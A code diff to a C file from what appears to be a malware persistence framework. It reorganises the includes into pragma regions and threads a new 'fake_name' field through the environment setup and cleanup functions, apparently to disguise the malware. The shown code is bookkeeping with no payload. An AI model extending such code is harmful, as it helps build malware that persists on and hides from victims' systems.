@@ -1,13 +1,19 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include "../../headers/library/persistency_hub.h"
-#include "../../headers/helpers/helpers.h"
-#include "../../headers/errors.h"
+#pragma region RequiredLibraries
+
+	#include <stdio.h>
+	#include <stdlib.h>
+	#include <string.h>
+	#include "../../headers/library/persistency_hub.h"
+	#include "../../headers/helpers/helpers.h"
+	#include "../../headers/errors.h"
+
+#pragma endregion
+
+#pragma region FunctionDefinitions
 
 #pragma region Environment
 
-int set_environment(ENVIRONMENT **env, OPERATING_SYSTEM os, ARCHITECTURE arch, ROOTED_STATE is_root, const char *abs_path_to_malware){
+int set_environment(ENVIRONMENT **env, OPERATING_SYSTEM os, ARCHITECTURE arch, ROOTED_STATE is_root, const char *abs_path_to_malware, char *fake_name){
 
 	int error;
 
@@ -34,6 +40,9 @@ int set_environment(ENVIRONMENT **env, OPERATING_SYSTEM os, ARCHITECTURE arch, R
 		return error;
 	get_parent_folder_path((*env)->working_directory);
 
+	// Set the fake name
+	copy_string(&(*env)->fake_name, fake_name, 0);
+
 	// Change directory
 	change_working_directory((*env)->working_directory);
 
@@ -42,7 +51,7 @@ int set_environment(ENVIRONMENT **env, OPERATING_SYSTEM os, ARCHITECTURE arch, R
 
 }
 
-int autoset_environment(ENVIRONMENT **env){
+int autoset_environment(ENVIRONMENT **env, char *fake_name){
 
 	ARCHITECTURE arch;
 	ROOTED_STATE is_root;
@@ -65,7 +74,7 @@ int autoset_environment(ENVIRONMENT **env){
 		return is_error;
 
 	// Init the environment
-	is_error = set_environment(env, TARGET_OPERAING_SYSTEM, arch, is_root, malware_path);
+	is_error = set_environment(env, TARGET_OPERAING_SYSTEM, arch, is_root, malware_path, fake_name);
 	free(malware_path);
 
 	// Return
@@ -79,6 +88,7 @@ int free_environment(ENVIRONMENT **env){
 	if (*env != NULL){
 		free((*env)->malware_path);
 		free((*env)->working_directory);
+		free((*env)->fake_name);
 		free(*env);
 		*env = NULL;
 	}
@@ -214,5 +224,7 @@ int unlink_module(LOADED_MODULE **module){
 	return 0;
 
 }
+
+#pragma endregion
 
 #pragma endregion
